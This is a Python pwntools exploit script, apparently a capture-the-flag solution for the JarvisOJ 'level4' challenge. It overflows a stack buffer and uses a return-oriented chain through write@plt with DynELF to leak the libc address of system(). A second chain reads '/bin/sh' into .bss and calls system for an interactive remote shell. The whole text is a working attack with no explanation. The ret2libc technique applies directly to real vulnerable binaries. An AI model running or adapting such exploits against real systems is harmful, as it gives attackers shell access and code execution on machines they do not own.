#coding:utf-8

from pwn import *
from time import sleep
pwn = remote('pwn2.jarvisoj.com', 9880)

read_plt = 0x8048310
write_plt = 0x08048340
vulner_func = 0x804844B
bss = 0x804A024
pppr = 0x8048509 # objdump -d level4 | grep pop -C3
main = 0x08048470

def leak(address):
    payload = 'a'*(0x88+4) + p32(write_plt) + p32(pppr) + p32(1) + p32(address) + p32(4) + p32(main)
    pwn.send(payload)
    data = pwn.recv(4)
    return data

d = DynELF(leak, elf=ELF('./level4'))
system_addr = d.lookup('system','libc')
log.success('leak system address: ' + hex(system_addr))

payload = 'a'*(0x88+4) + p32(read_plt) + p32(pppr) + p32(0) + p32(bss) + p32(8) + p32(system_addr) + p32(vulner_func) + p32(bss)
pwn.send(payload)
sleep(0.1)
pwn.send("/bin/sh\x00")
pwn.interactive()
